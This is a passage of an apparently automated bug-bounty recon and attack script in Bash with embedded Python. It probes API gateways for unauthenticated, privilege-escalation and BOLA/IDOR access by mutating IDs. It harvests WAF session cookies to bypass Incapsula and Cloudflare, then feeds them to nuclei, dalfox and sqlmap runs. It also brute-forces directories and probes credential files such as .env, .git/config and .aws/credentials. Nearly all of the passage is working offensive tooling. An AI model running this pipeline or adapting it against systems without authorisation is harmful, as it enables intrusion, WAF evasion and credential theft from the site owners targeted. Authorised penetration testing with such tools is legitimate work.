admin_kw = ['admin','role','permission','userpermission','saveUser','updateUser',
            'editUser','updateRole','deleteUser','deleteRespondent','deleteQuestion',
            'bulk','modifyAttendees','updateSipCategory','deletesocialinfra']

findings = []

def probe_request(page, url, extra_headers=None, cookies_str=None):
    """Navigate with optional extra headers and cookies, return (status, body)."""
    ctx_opts = {}
    if extra_headers:
        ctx_opts['extra_http_headers'] = extra_headers
    if cookies_str:
        # Set cookies via JS before navigation
        pass
    try:
        resp = page.goto(url, timeout=12000, wait_until='domcontentloaded')
        status = resp.status if resp else 0
        body   = page.content()
        return status, body
    except Exception as e:
        return 0, str(e)

def classify(status, body, url=''):
    waf = 'Incapsula' in body or '_Incapsula_Resource' in body
    if waf:
        return 'WAF', ''
    text = strip_tags(body)[:200].replace('\n', ' ')
    if status == 200:
        return 'OPEN', text
    elif status in (401, 403):
        return 'AUTH_REQUIRED', ''
    elif status == 302:
        return 'REDIRECT', ''
    elif status == 500:
        return '500_ERROR', text
    else:
        return str(status), ''

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)

    # â”€â”€ Context 1: No auth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ctx_noauth = browser.new_context()
    page_noauth = ctx_noauth.new_page()

    # â”€â”€ Context 2: With auth (if available) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    auth_headers = {}
    if auth_header:
        k, _, v = auth_header.partition(': ')
        auth_headers[k] = v
    ctx_auth = browser.new_context(extra_http_headers=auth_headers) if has_auth else None
    page_auth = ctx_auth.new_page() if ctx_auth else None

    if auth_cookie and page_auth:
        # Inject cookies via page evaluate after first nav
        pass

    waf_cookies_captured = {}   # gw -> "name=val; name2=val2"
    all_auth_urls   = []        # full URLs reachable with auth
    all_unauth_urls = []        # full URLs open without auth

    for gw in sorted(gw_hosts):
        findings.append(f"\n{'='*65}")
        findings.append(f"Gateway: {gw}")
        findings.append('='*65)

        # WAF warm-up on both contexts â€” also captures WAF session cookies
        for pg in filter(None, [page_noauth, page_auth]):
            try:
                pg.goto(gw + '/', timeout=15000, wait_until='domcontentloaded')
                # Inject user-supplied cookies into auth context
                if pg is page_auth and auth_cookie:
                    for pair in auth_cookie.split(';'):
                        pair = pair.strip()
                        if '=' in pair:
                            name, _, val = pair.partition('=')
                            try:
                                pg.context.add_cookies([{'name': name.strip(), 'value': val.strip(),
                                                         'url': gw}])
                            except Exception:
                                pass
            except Exception:
                pass

        # Capture WAF bypass cookies (Incapsula / Cloudflare / DataDome etc.)
        try:
            capture_pg = page_auth if page_auth else page_noauth
            cookies = capture_pg.context.cookies()
            waf_pairs = [f"{c['name']}={c['value']}" for c in cookies
                         if any(k in c['name'].lower()
                                for k in ['incap','visid','nlbi','reese','datadome','cf_clearance','__cf'])]
            if waf_pairs:
                waf_cookies_captured[gw] = '; '.join(waf_pairs)
        except Exception:
            pass

        noauth_open  = []   # (path, snippet)
        auth_open    = []   # (path, snippet)  â€” accessible with token
        priv_esc     = []   # admin endpoints reachable with current token
        bola_hits    = []   # BOLA candidates

        for path in probe_paths:
            url = gw + path

            # â”€â”€ Unauthenticated probe â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            s_no, b_no = probe_request(page_noauth, url)
            tag_no, snip_no = classify(s_no, b_no)
            findings.append(f"  {s_no:>5}  [no-auth]  {path:<55} [{tag_no}]")
            if tag_no == 'OPEN':
                noauth_open.append((path, snip_no))

            # â”€â”€ Authenticated probe â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            if has_auth and page_auth:
                s_au, b_au = probe_request(page_auth, url)
                tag_au, snip_au = classify(s_au, b_au)
                findings.append(f"  {s_au:>5}  [auth]     {path:<55} [{tag_au}]")

                if tag_au == 'OPEN':
                    auth_open.append((path, snip_au))
                    # Privilege escalation check â€” auth'd access to admin path
                    if any(k in path.lower() for k in admin_kw):
                        priv_esc.append((path, snip_au))

                # BOLA check: if auth'd returns data but noauth was 401/403,
                # try substituting common IDs to detect object-level access
                if tag_au == 'OPEN' and tag_no == 'AUTH_REQUIRED':
                    # Try replacing numeric segments and UUIDs with alt IDs
                    uuid_pat = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
                    num_pat  = re.compile(r'/(\d+)(?:/|$)')
                    bola_candidates = []
                    if jwt_user_id and jwt_user_id in path:
                        # Try a different user ID
                        alt_id = str(int(jwt_user_id) + 1) if jwt_user_id.isdigit() else jwt_user_id + '_alt'
                        bola_candidates.append((path.replace(jwt_user_id, alt_id), f'alt_user_id={alt_id}'))
                    for m in num_pat.finditer(path):
                        orig = m.group(1)
                        for alt in [str(int(orig)+1), str(int(orig)-1), '1', '0']:
                            if alt != orig:
                                bola_candidates.append((num_pat.sub(f'/{alt}/', path, count=1), f'id={orig}â†’{alt}'))
                                break
                    for alt_path, label in bola_candidates[:2]:
                        alt_url = gw + alt_path
                        s_b, b_b = probe_request(page_auth, alt_url)
                        tag_b, snip_b = classify(s_b, b_b)
                        if tag_b == 'OPEN':
                            bola_hits.append((path, alt_path, label, snip_b))
                            findings.append(f"  {s_b:>5}  [BOLA]     {alt_path:<55} *** BOLA candidate ({label})")

        # â”€â”€ Collect URLs for tool scanning â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        for ep, _ in noauth_open:
            all_unauth_urls.append(gw + ep)
        for ep, _ in auth_open:
            all_auth_urls.append(gw + ep)
        for ep, _ in priv_esc:
            if (gw + ep) not in all_auth_urls:
                all_auth_urls.append(gw + ep)

        # â”€â”€ Summary for this gateway â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if noauth_open:
            findings.append(f"\n  [!!!] UNAUTHENTICATED ACCESS â€” {len(noauth_open)} endpoint(s) open on {gw}:")
            for ep, snip in noauth_open:
                findings.append(f"    *** UNAUTH: {gw}{ep}")
                if snip:
                    findings.append(f"        {snip}")

        if auth_open:
            findings.append(f"\n  [+] AUTHENTICATED ACCESS â€” {len(auth_open)} endpoint(s) respond with token on {gw}:")
            for ep, snip in auth_open:
                findings.append(f"    [AUTH-OPEN] {gw}{ep}")
                if snip:
                    findings.append(f"        {snip[:150]}")

        if priv_esc:
            findings.append(f"\n  [!!!] PRIVILEGE ESCALATION â€” {len(priv_esc)} ADMIN endpoint(s) reachable with current token:")
            for ep, snip in priv_esc:
                findings.append(f"    *** PRIV-ESC: {gw}{ep}")
                if snip:
                    findings.append(f"        {snip[:150]}")

        if bola_hits:
            findings.append(f"\n  [!!!] BOLA â€” {len(bola_hits)} object-level access issue(s) detected:")
            for orig, alt, label, snip in bola_hits:
                findings.append(f"    *** BOLA: {gw}{alt}  (mutated from {orig}, {label})")
                if snip:
                    findings.append(f"        {snip[:150]}")

    browser.close()

with open(probe_out, 'w') as f:
    f.write('\n'.join(findings) + '\n')

# Write WAF cookies â€” all unique cookies across all gateways (tools will use these)
all_waf = '; '.join(set('; '.join(waf_cookies_captured.values()).split('; ')))
with open(waf_cookies_file, 'w') as f:
    f.write(all_waf + '\n')
    f.write(f"# Per-gateway:\n")
    for gw, ck in waf_cookies_captured.items():
        f.write(f"# {gw}: {ck}\n")

# Write URL lists for tool scanning
with open(auth_urls_file, 'w') as f:
    f.write('\n'.join(sorted(set(all_auth_urls))) + '\n')

with open(unauth_urls_file, 'w') as f:
    f.write('\n'.join(sorted(set(all_unauth_urls))) + '\n')

unauth_count = sum(1 for l in findings if '*** UNAUTH:' in l)
auth_open_count = sum(1 for l in findings if '[AUTH-OPEN]' in l)
priv_esc_count = sum(1 for l in findings if '*** PRIV-ESC:' in l)
bola_count = sum(1 for l in findings if '*** BOLA:' in l)
print(f"PROBE_DONE:{unauth_count}:{auth_open_count}:{priv_esc_count}:{bola_count}")
PYPROBE

    # Report findings
    local unauth_count; unauth_count=$(grep -c '\*\*\* UNAUTH:'    "$JS_PROBE_RESULTS" 2>/dev/null || echo 0)
    local auth_open_c;  auth_open_c=$(grep -c '\[AUTH-OPEN\]'      "$JS_PROBE_RESULTS" 2>/dev/null || echo 0)
    local priv_esc_c;   priv_esc_c=$(grep -c '\*\*\* PRIV-ESC:'   "$JS_PROBE_RESULTS" 2>/dev/null || echo 0)
    local bola_c;       bola_c=$(grep -c '\*\*\* BOLA:'           "$JS_PROBE_RESULTS" 2>/dev/null || echo 0)

    [[ $unauth_count -gt 0 ]] && {
        log_finding "JS probe: $unauth_count endpoint(s) accessible WITHOUT authentication!"
        grep '\*\*\* UNAUTH:' "$JS_PROBE_RESULTS" | while IFS= read -r line; do log_finding "  $line"; done
    }
    [[ $priv_esc_c -gt 0 ]] && {
        log_finding "JS probe: $priv_esc_c ADMIN/privileged endpoint(s) reachable with current token!"
        grep '\*\*\* PRIV-ESC:' "$JS_PROBE_RESULTS" | while IFS= read -r line; do log_finding "  $line"; done
    }
    [[ $bola_c -gt 0 ]] && {
        log_finding "JS probe: $bola_c BOLA/IDOR candidate(s) found!"
        grep '\*\*\* BOLA:' "$JS_PROBE_RESULTS" | while IFS= read -r line; do log_finding "  $line"; done
    }
    [[ $unauth_count -eq 0 && $priv_esc_c -eq 0 && $bola_c -eq 0 ]] && \
        log_ok "  Probe complete â€” auth enforced, no privilege issues detected"

    $_has_auth && log_ok "  Authenticated endpoints reachable: $auth_open_c"

    log_ok "Endpoint probe saved: $JS_PROBE_RESULTS"
    log_ok "API endpoint list:    $JS_API_ENDPOINTS"
    log_ok "Environment URLs:     $JS_ENV_URLS"

    # â”€â”€ Active scanning against discovered endpoints â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Build WAF bypass cookie header â€” combine Incapsula cookies with user auth
    local _waf_cookie_str; _waf_cookie_str=$(head -1 "$_waf_cookies_file" 2>/dev/null || echo "")
    local _combined_cookie="$_waf_cookie_str"
    [[ -n "$AUTH_COOKIE" ]] && _combined_cookie="${_combined_cookie}${_combined_cookie:+; }${AUTH_COOKIE}"

    # Build extra header args for tools
    local _extra_headers=()
    [[ -n "$_auth_header_val" ]] && _extra_headers+=("-H" "$_auth_header_val")
    [[ -n "$_combined_cookie" ]] && _extra_headers+=("-H" "Cookie: $_combined_cookie")

    # â”€â”€ Nuclei against auth-reachable endpoints â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local _scan_urls_file="$_auth_urls_file"
    # If no auth, fall back to unauthenticated open URLs
    if [[ ! -s "$_scan_urls_file" ]]; then
        _scan_urls_file="$_unauth_urls_file"
    fi

    if [[ -s "$_scan_urls_file" ]] && command -v nuclei &>/dev/null; then
        local _url_count; _url_count=$(wc -l < "$_scan_urls_file")
        log_info "Running nuclei against $_url_count discovered API endpoint(s) (WAF bypass + auth)..."
        local _nuclei_api_out="$_js_vuln_dir/nuclei_api.jsonl"
        touch "$_nuclei_api_out"

        # API-focused template categories:
        # exposures (data leaks), auth-bypass, idor, misconfig, token leaks, injection
        local _nuclei_tags="auth-bypass,token,exposure,misconfig,injection,idor,privilege,takeover,default-login"

        nuclei -l "$_scan_urls_file" \
            -tags "$_nuclei_tags" \
            -severity low,medium,high,critical \
            -rate-limit "$RATE_LIMIT" \
            -timeout 10 \
            -retries 1 \
            -no-interactsh \
            -jsonl -o "$_nuclei_api_out" \
            "${_extra_headers[@]}" \
            "${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"}" \
            2>/dev/null || true

        # Also run generic http templates â€” catches server errors, redirects, info leaks
        nuclei -l "$_scan_urls_file" \
            -tags "tech,info,header,ssl" \
            -severity info,low,medium,high,critical \
            -rate-limit "$RATE_LIMIT" \
            -timeout 10 \
            -retries 1 \
            -no-interactsh \
            -jsonl -o "$_nuclei_api_out" \
            "${_extra_headers[@]}" \
            "${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"}" \
            2>/dev/null || true

        local _nuclei_hits; _nuclei_hits=$(wc -l < "$_nuclei_api_out" 2>/dev/null || echo 0)
        if [[ $_nuclei_hits -gt 0 ]]; then
            log_finding "API nuclei: $_nuclei_hits finding(s) on discovered endpoints"
            # Copy critical/high into the main nuclei findings for report
            jq -c 'select(.info.severity == "critical" or .info.severity == "high")' \
                "$_nuclei_api_out" >> "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || true
            jq -c '.' "$_nuclei_api_out" >> "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || true
        else
            log_ok "  API nuclei: no findings"
        fi
    fi

    # â”€â”€ XSS (dalfox) against GET-style API endpoints â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -s "$_scan_urls_file" ]] && command -v dalfox &>/dev/null; then
        log_info "Running dalfox XSS scan against API endpoints (WAF bypass + auth)..."
        local _dalfox_api_out="$_js_vuln_dir/dalfox_api.txt"
        local _dalfox_cookie_args=()
        [[ -n "$_combined_cookie" ]] && _dalfox_cookie_args+=("--cookie" "$_combined_cookie")
        [[ -n "$_auth_header_val" ]] && _dalfox_cookie_args+=("--header" "$_auth_header_val")

        dalfox file "$_scan_urls_file" \
            "${_dalfox_cookie_args[@]}" \
            --skip-bav \
            --timeout 10 \
            --delay 100 \
            --output "$_dalfox_api_out" \
            "${AUTH_DALFOX_OPTS[@]+"${AUTH_DALFOX_OPTS[@]}"}" \
            2>/dev/null || true

        local _dalfox_hits; _dalfox_hits=$(grep -c '\[V\]\|VULNERABLE' "$_dalfox_api_out" 2>/dev/null || echo 0)
        [[ $_dalfox_hits -gt 0 ]] && log_finding "API dalfox: $_dalfox_hits XSS finding(s)" || log_ok "  API dalfox: no XSS"
    fi

    # â”€â”€ SQLi (sqlmap) against API endpoints with params â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -s "$_scan_urls_file" ]] && command -v sqlmap &>/dev/null; then
        # Only test URLs that have query params or POST-style paths
        local _sqli_targets; _sqli_targets=$(grep '[?=]' "$_scan_urls_file" || true)
        if [[ -n "$_sqli_targets" ]]; then
            log_info "Running sqlmap against API endpoints with parameters..."
            local _sqlmap_api_out="$_js_vuln_dir/sqlmap_api.txt"
            local _sqlmap_cookie_args=()
            [[ -n "$_combined_cookie" ]] && _sqlmap_cookie_args+=("--cookie" "$_combined_cookie")
            [[ -n "$_auth_header_val" ]] && _sqlmap_cookie_args+=("--headers" "$_auth_header_val")

            echo "$_sqli_targets" | head -20 | while IFS= read -r sqli_url; do
                sqlmap -u "$sqli_url" \
                    --batch --level=2 --risk=1 \
                    --timeout=10 --retries=1 \
                    "${_sqlmap_cookie_args[@]}" \
                    "${AUTH_SQLMAP_OPTS[@]+"${AUTH_SQLMAP_OPTS[@]}"}" \
                    --output-dir="$_js_vuln_dir/sqlmap" \
                    2>/dev/null || true
            done
            log_ok "  SQLmap scan complete â€” results in $_js_vuln_dir/sqlmap/"
        fi
    fi

    log_ok "JS API scan complete â€” results in $_js_vuln_dir/"
}

# â”€â”€â”€ Phase 6: Content Discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_content() {
    if $SKIP_CONTENT; then
        log_warn "Skipping content discovery (--skip-content)"
        return
    fi

    log_phase "Phase 6: Content Discovery (Directory/File Bruteforce)"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for content discovery."; return; }

    # Find best available wordlist
    local wordlist=""
    for w in \
        "${WORDLIST_DIR}/Discovery/Web-Content/raft-large-directories.txt" \
        "${WORDLIST_DIR}/Discovery/Web-Content/raft-medium-directories.txt" \
        "${WORDLIST_DIR}/Discovery/Web-Content/common.txt" \
        "/usr/share/dirb/wordlists/common.txt"; do
        [[ -f "$w" ]] && { wordlist="$w"; break; }
    done

    if [[ -z "$wordlist" ]]; then
        log_warn "No wordlist found. Skipping content discovery."
        log_info "  Install SecLists: sudo apt install seclists"
        return
    fi

    log_info "Using wordlist: $(basename "$wordlist")"

    # Limit to first 20 live hosts for performance
    local hosts_to_scan; hosts_to_scan=$(head -20 "$LIVE_HOSTS")

    # Tune thread count based on WAF presence to avoid triggering rate-limits
    local ffuf_threads=100
    local ferox_threads=50
    if $WAF_DETECTED; then
        ffuf_threads=20
        ferox_threads=10
        log_warn "  WAF detected (${WAF_NAME}): reduced threads to ffuf=${ffuf_threads}, ferox=${ferox_threads}"
    fi

    if require_tool ffuf; then
        log_info "Running ffuf on top hosts (${ffuf_threads} threads, max 5m/host)..."
        while IFS= read -r url; do
            local host_slug; host_slug=$(echo "$url" | sed 's|https\?://||;s|/|_|g')
            local _ffuf_cmd="ffuf -u \"${url}/FUZZ\" -w \"$wordlist\" -mc 200,301,302,403,405 -t ${ffuf_threads} -timeout 10 -of json -o \"$OUTDIR/recon/wordlists/ffuf_${host_slug}.json\" -s"
            timeout 300 ffuf -u "${url}/FUZZ" \
                -w "$wordlist" \
                -mc 200,301,302,403,405 \
                -t "$ffuf_threads" \
                -timeout 10 \
                -of json \
                ${AUTH_FFUF_OPTS[@]+"${AUTH_FFUF_OPTS[@]}"} \
                -o "$OUTDIR/recon/wordlists/ffuf_${host_slug}.json" \
                -s 2>/dev/null || \
                { [[ $? -eq 124 ]] && defer_cmd "ffuf on ${url} (timed out at 5m)" "$_ffuf_cmd"; true; }
            waf_sleep
        done <<< "$hosts_to_scan"
        log_ok "ffuf scans saved to: $OUTDIR/recon/wordlists/"
    fi

    # Feroxbuster for recursive discovery (max 5m/host)
    if require_tool feroxbuster && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Running feroxbuster (recursive, ${ferox_threads} threads, max 5m/host)..."
        head -10 "$LIVE_HOSTS" | while IFS= read -r url; do
            local host_slug; host_slug=$(echo "$url" | sed 's|https\?://||;s|/|_|g')
            local _ferox_cmd="feroxbuster -u \"$url\" -w \"$wordlist\" -t ${ferox_threads} --timeout 10 -r --recursion-depth 2 --silent -o \"$OUTDIR/recon/wordlists/ferox_${host_slug}.txt\""
            timeout 300 feroxbuster -u "$url" \
                -w "$wordlist" \
                -t "$ferox_threads" \
                --timeout 10 \
                -r \
                --recursion-depth 2 \
                --silent \
                ${AUTH_FEROX_OPTS[@]+"${AUTH_FEROX_OPTS[@]}"} \
                -o "$OUTDIR/recon/wordlists/ferox_${host_slug}.txt" \
                2>/dev/null || \
                { [[ $? -eq 124 ]] && defer_cmd "feroxbuster on ${url} (timed out at 5m)" "$_ferox_cmd"; true; }
            waf_sleep
        done
        log_ok "feroxbuster scans complete"
    fi

    # .env / backup / sensitive file probing
    if require_tool httpx && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Probing sensitive paths (.env, .git, backup files)..."
        local sensitive_paths=".env,.git/config,.git/HEAD,backup.zip,backup.sql,db.sql,.htpasswd,web.config,phpinfo.php,wp-config.php,config.php,database.yml,secrets.yml,credentials.json,.aws/credentials,composer.json,package.json,Dockerfile,.dockerenv,server-status,server-info,elmah.axd,trace.axd,crossdomain.xml,.DS_Store,robots.txt,sitemap.xml"
        httpx -l "$LIVE_HOSTS" \
            -path "$sensitive_paths" \
            -mc 200,403 \
            -silent \
            -threads 50 \
            ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} \
            -o "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || true
        local found; found=$(wc -l < "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || echo 0)
        [[ "$found" -gt 0 ]] && log_finding "Sensitive files found: ${found} â†’ $HTTP_DIR/sensitive_files.txt"
    fi
}

# â”€â”€â”€ Phase 7: Vulnerability Scanning â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_vulns() {
    if $SKIP_VULNS; then
        log_warn "Skipping vulnerability scan (--skip-vulns)"
        return
    fi

    log_phase "Phase 7: Nuclei Vulnerability Scanning"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for vuln scanning."; return; }

    if ! require_tool nuclei; then
        log_warn "nuclei not found. Checking common fallback paths..."
        if [[ -x "${HOME}/Tools/linux/nuclei" ]]; then
            NUCLEI_BIN="${HOME}/Tools/linux/nuclei"
        else
            return
        fi
    else
        NUCLEI_BIN="nuclei"
    fi

    # Update templates once (fast, non-blocking check)
    log_info "Updating nuclei templates..."
    $NUCLEI_BIN -update-templates -silent 2>/dev/null || true

    # â”€â”€ Parallel nuclei scans â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Run independent scan categories concurrently in background;
    # collect PIDs and wait for all before merging.
    log_info "Launching parallel nuclei scan categories..."

    local pids=()
    local auth_opts=()
    ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]:+true}"} 2>/dev/null && \
        auth_opts=("${AUTH_NUCLEI_OPTS[@]}")

    # 1 â€” Critical & High (highest priority, slightly more concurrency)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -s critical,high \
            -rl "$RATE_LIMIT" -c 25 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/critical_high.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 2 â€” CVE templates
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags cve \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/cves.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 3 â€” Misconfigurations
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags misconfig \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/misconfigs.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 4 â€” Exposures & info disclosure
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags exposure \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/exposures.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 5 â€” Default-login templates (lower rate to avoid lockouts)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags "default-login" \
            -rl 30 -c 10 -j \
            -o "$VULN_DIR/nuclei/default_logins.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 6 â€” DAST fuzzing against all live hosts (headless for SPA/JS-heavy apps)
    (
        cp "$LIVE_HOSTS" "$HTTP_DIR/dast_targets.txt"
        $NUCLEI_BIN -l "$HTTP_DIR/dast_targets.txt" -dast \
            -rl 25 -c 5 -j \
            -headless \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/dast.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 9 â€” Injection/auth/logic vulnerability tags â€” covers xss/ssrf/cors so those phases
    #     won't re-run nuclei (eliminates duplicate scanning)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" \
            -tags "sqli,xss,ssrf,lfi,rce,jwt,idor,graphql,oauth,injection,auth-bypass,cors,redirect" \
            -rl "$RATE_LIMIT" -c 20 -j \
            -retries 2 \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/injections.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 10 â€” Exposure/disclosure templates â€” covers secrets/api-keys so phase_secrets won't re-run
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" \
            -tags "token,api,key,secret,panel,login,auth,config,debug,swagger,graphql,exposure" \
            -s critical,high,medium \
            -rl "$RATE_LIMIT" -c 20 -j \
            -retries 2 \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/panels_tokens.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 7 â€” WordPress (only if detected)
    if [[ -s "$HTTP_DIR/wordpress_hosts.txt" ]]; then
        (
            $NUCLEI_BIN -l "$HTTP_DIR/wordpress_hosts.txt" -tags wordpress \
                -rl 50 -c 15 -j \
                ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
                -o "$VULN_DIR/nuclei/wordpress.jsonl" \
                -silent 2>/dev/null || true
        ) &
        pids+=($!)
    fi

    # 8 â€” Dev tools (Jenkins, Jira, Confluence, GitLab)
    if [[ -s "$HTTP_DIR/devtools_hosts.txt" ]]; then
        (
            $NUCLEI_BIN -l "$HTTP_DIR/devtools_hosts.txt" \
                -tags "jenkins,jira,confluence,gitlab" \
                -rl 50 -c 15 -j \
                ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
                -o "$VULN_DIR/nuclei/devtools.jsonl" \
                -silent 2>/dev/null || true
        ) &
        pids+=($!)
    fi

    log_info "  ${#pids[@]} scan jobs running in parallel (PIDs: ${pids[*]})..."

    # Global nuclei timeout â€” kill any jobs still running after 15 minutes.
    # Prevents indefinite hangs when WAFs (Incapsula, Cloudflare) block probes.
    local NUCLEI_MAX_SECS=900
    local nuclei_start=$SECONDS

    local done_count=0
    while [[ $done_count -lt ${#pids[@]} ]]; do
        done_count=0
        for pid in "${pids[@]}"; do
            kill -0 "$pid" 2>/dev/null || (( done_count++ )) || true
        done
        tg_poll_commands 2>/dev/null || true
        $TG_STOP_REQUESTED && { log_warn "Stop requested via Telegram."; break; }

        # Enforce global timeout
        local elapsed=$(( SECONDS - nuclei_start ))
        if [[ $elapsed -ge $NUCLEI_MAX_SECS ]]; then
            log_warn "Nuclei phase timeout (${NUCLEI_MAX_SECS}s) â€” killing remaining jobs and continuing"
            for pid in "${pids[@]}"; do
                kill "$pid" 2>/dev/null || true
            done
            break
        fi
        sleep "$TG_POLL_INTERVAL"
    done

    # Ensure all jobs finished (or were killed)
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    # Combine all findings, deduplicate
    cat "$VULN_DIR/nuclei/"*.jsonl 2>/dev/null | sort -u > "$VULN_DIR/nuclei/all_findings.jsonl"

    # Re-derive critical_high.jsonl from merged results so findings from all jobs are included
    python3 -c "
import sys, json
for line in open('$VULN_DIR/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        if d.get('info',{}).get('severity','').lower() in ('critical','high'):
            print(line.strip())
    except: pass
" 2>/dev/null > "$VULN_DIR/nuclei/critical_high.jsonl" || true

    local total; total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
    local crit_count; crit_count=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    log_ok "Total nuclei findings: ${BOLD}${total}${RESET} (critical/high: ${crit_count})"

    [[ "$crit_count" -gt 0 ]] && {
        log_finding "Critical/High findings: ${BOLD}${crit_count}${RESET}"
        notify_all "ðŸš¨ *Critical/High findings on ${TARGET}*: ${crit_count} findings\nNuclei total: ${total}"
    }
}

# â”€â”€â”€ Phase 8: XSS Detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# NOTE: Nuclei XSS templates already ran in phase_vulns (injections.jsonl, tags: xss).
